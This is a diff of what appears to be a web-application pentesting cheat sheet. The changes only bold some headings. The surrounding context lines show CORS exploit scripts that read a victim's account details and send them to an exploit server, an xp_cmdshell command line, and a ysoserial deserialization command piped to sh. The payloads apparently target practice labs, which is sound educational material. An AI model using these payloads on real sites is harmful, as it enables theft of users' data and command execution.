@@ -566,7 +566,7 @@ xp_cmdshell 'COMMAND';
 
 ### <ins>Business logic vulnerabilities</ins>
 
-Examples:
+**Examples**
 - Excessive trust in client-side controls
 - 2FA broken logic
 - Failing to handle unconventional input
@@ -729,7 +729,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 
 ### <ins>CORS</ins>
 
-Classic CORS vulnerability
+**Classic CORS vulnerability**
 ```HTML
 <script>
   var req = new XMLHttpRequest();
@@ -743,7 +743,7 @@ Classic CORS vulnerability
 </script>
 ```
 
-CORS vulnerability with null origin
+**CORS vulnerability with null origin**
 ```HTML
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
   var req = new XMLHttpRequest();
@@ -758,7 +758,7 @@ CORS vulnerability with null origin
 </iframe>
 ```
 
-CORS vulnerability with trusted insecure protocols
+**CORS vulnerability with trusted insecure protocols**
 ```HTML
 <script>
   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
@@ -782,7 +782,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . ec
 
 [PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.
 
-Burp extensions:
+**Burp extensions**
 - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
 - [Java Serialized Payloads](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
 - [GadgetProbe](https://portswigger.net/bappstore/e20cad259d73403bba5ac4e393a8583f)
